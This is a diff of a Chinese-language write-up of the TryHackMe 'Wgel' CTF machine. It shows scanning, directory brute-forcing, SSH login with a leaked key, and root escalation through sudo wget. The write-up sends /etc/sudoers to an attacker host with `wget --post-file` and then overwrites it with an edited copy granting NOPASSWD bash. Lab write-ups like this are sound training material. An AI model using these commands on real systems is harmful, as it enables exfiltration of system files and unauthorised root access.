@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~]
-└─# nmap -sV -Pn 10.10.106.99    
+└─#  nmap -sV -Pn 10.10.106.99    
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-25 23:41 EDT
 Nmap scan report for 10.10.106.99
@@ -17,10 +17,10 @@ Nmap done: 1 IP address (1 host up) scanned in 15.12 seconds
 ```
 
 
-#目录爆破
+# 目录爆破
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -u http://10.10.106.99 -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-lowercase-2.3-medium.txt
+└─#  python3 dirsearch.py -u http://10.10.106.99 -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-lowercase-2.3-medium.txt
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -43,7 +43,7 @@ sitemap是一个叫```UNAPP```的软件网站介绍页，继续对这个这个�
 
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py  -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.106.99/sitemap/
+└─#  python3 dirsearch.py  -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.106.99/sitemap/
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -99,7 +99,7 @@ Apache/2.4.18 (Ubuntu) Server at 10.10.106.99 Port 80
 根据用户名和ssh登录秘钥，登录靶机，拿到user.txt
 ```
 ┌──(root💀kali)-[~/tryhackme/wgel]
-└─# ssh -i id_rsa jessie@10.10.106.99 
+└─#  ssh -i id_rsa jessie@10.10.106.99 
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
 
  * Documentation:  https://help.ubuntu.com
@@ -133,7 +133,7 @@ jessie@CorpOne:~$ cat /home/jessie/Documents/user_flag.txt
 
 ```
 
-#查看sudo权限
+# 查看sudo权限
 ```
 jessie@CorpOne:~$ sudo -l
 Matching Defaults entries for jessie on CorpOne:
@@ -144,7 +144,7 @@ User jessie may run the following commands on CorpOne:
     (root) NOPASSWD: /usr/bin/wget
 
 ```
-#提权思路
+# 提权思路
 
 
 通过wget我们事实上可以更换靶机上的任何文件，那么我们现在尝试替换```/etc/sudoers```文件，把```jessie  ALL=(root) NOPASSWD: /bin/bash```这一行添加到sudoers文件中，然后再覆盖掉靶机上的sudoers文件
@@ -164,43 +164,43 @@ User jessie may run the following commands on CorpOne:
 把```/etc/sudoers```传回攻击机以备编辑
 ```sudo  -u root /usr/bin/wget --post-file=/etc/sudoers  10.13.21.169```
 
-#编辑sudoers
+# 编辑sudoers
 ```
-#
-# This file MUST be edited with the 'visudo' command as root.
-#
-# Please consider adding local content in /etc/sudoers.d/ instead of
-# directly modifying this file.
-#
-# See the man page for details on how to write a sudoers file.
-#
+# 
+#  This file MUST be edited with the 'visudo' command as root.
+# 
+#  Please consider adding local content in /etc/sudoers.d/ instead of
+#  directly modifying this file.
+# 
+#  See the man page for details on how to write a sudoers file.
+# 
 Defaults        env_reset
 Defaults        mail_badpass
 Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
 
-# Host alias specification
+#  Host alias specification
 
-# User alias specification
+#  User alias specification
 
-# Cmnd alias specification
+#  Cmnd alias specification
 
-# User privilege specification
+#  User privilege specification
 root    ALL=(ALL:ALL) ALL
 
-# Members of the admin group may gain root privileges
+#  Members of the admin group may gain root privileges
 %admin ALL=(ALL) ALL
 
-# Allow members of group sudo to execute any command
+#  Allow members of group sudo to execute any command
 %sudo   ALL=(ALL:ALL) ALL
 
-# See sudoers(5) for more information on "#include" directives:
+#  See sudoers(5) for more information on "# include" directives:
 
-#includedir /etc/sudoers.d
+# includedir /etc/sudoers.d
 jessie  ALL=(root) NOPASSWD: /usr/bin/wget
 jessie  ALL=(root) NOPASSWD: /bin/bash
 ```
 
-#从靶机下载覆盖编辑好的sudoers文件，成功提权
+# 从靶机下载覆盖编辑好的sudoers文件，成功提权
 ```
 jessie@CorpOne:~$ sudo /usr/bin/wget http://10.13.21.169:8000/sudoers -O /etc/sudoers
 --2021-09-26 12:45:55--  http://10.13.21.169:8000/sudoers
@@ -222,7 +222,7 @@ User jessie may run the following commands on CorpOne:
     (root) NOPASSWD: /usr/bin/wget
     (root) NOPASSWD: /bin/bash
 jessie@CorpOne:~$ sudo bash
-root@CorpOne:~# cat /root/root_flag.txt 
+root@CorpOne:~#  cat /root/root_flag.txt 
 b1b968b37519ad1daa6408188649263d
-root@CorpOne:~# 
+root@CorpOne:~#  
 ```
